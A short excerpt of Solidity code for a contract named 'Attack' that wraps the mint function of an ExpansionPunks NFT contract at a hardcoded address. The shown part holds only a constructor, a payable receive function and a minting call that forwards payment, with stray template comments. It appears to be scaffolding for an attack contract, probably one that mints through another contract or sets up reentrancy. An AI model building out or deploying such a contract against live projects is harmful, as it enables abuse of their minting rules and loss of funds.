...
contract Attack {
    ...
    // ----- Owner config -----
    address public epc = 0xE6cC8D91483DfC341622Ea6fA6eaEf2DecD7bBEA;

    ExpansionPunks ep;

    // Constructor. We set the symbol and name and start with sa
    constructor(address payable _ecp ) {
        epc = _ecp;
        ep = ExpansionPunks(_ecp);
    }

    receive() external payable {}

    // ----- ERC721 functions -----
    function contractMint(uint256 _number)
        external
        payable
        returns (uint256[] memory result)
    {
        return ep.mint{value:msg.value}(_number);
